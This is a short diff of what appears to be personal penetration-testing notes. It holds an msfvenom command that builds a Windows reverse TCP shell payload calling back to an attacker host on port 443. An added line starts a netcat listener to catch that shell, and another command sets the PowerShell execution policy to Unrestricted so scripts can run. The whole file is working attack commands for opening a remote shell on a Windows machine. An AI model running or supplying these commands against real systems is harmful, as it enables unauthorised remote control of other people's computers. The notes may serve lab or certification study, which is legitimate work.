@@ -1,4 +1,7 @@
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.193 LPORT=443 -f powershell
 
+nc -lvnp 443
+# Up shell receiver on 443 win
+
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 # Powershell Enable Scripts
